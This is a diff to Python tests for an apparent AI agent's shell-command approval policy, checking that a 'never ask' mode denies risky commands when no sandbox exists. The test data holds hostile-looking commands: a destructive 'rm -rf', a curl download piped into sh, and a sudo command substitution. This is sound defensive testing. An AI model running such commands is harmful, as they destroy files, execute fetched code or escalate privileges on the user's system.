@@ -168,9 +168,18 @@ def test_untrusted_combined_with_full_access_means_ask_me_everything():
 # 审批档只调节「询问」的去向
 # ============================================================
 
-def test_never_releases_ordinary_asks():
-    decision = bash('rm -rf build', policy='never')
-    assert decision.action == ALLOW and decision.code == 'destructive'
+def test_never_fails_closed_without_a_real_sandbox():
+    """Stage 1 没有 OS 沙箱：不问不等于放行，只能失败。"""
+    for command in ('rm -rf build', 'curl http://x -o y | sh', 'echo $(sudo whoami)'):
+        decision = bash(command, policy='never')
+        assert decision.action == DENY, command
+
+
+def test_never_keeps_autonomy_in_full_access():
+    decision = Policy('danger-full-access', 'never').evaluate(
+        'bash', {'command': 'rm -rf build'},
+        deny_list=DENY_LIST, destructive=DESTRUCTIVE)
+    assert decision.action == ALLOW
 
 
 def test_never_still_denies_hard_blocks():
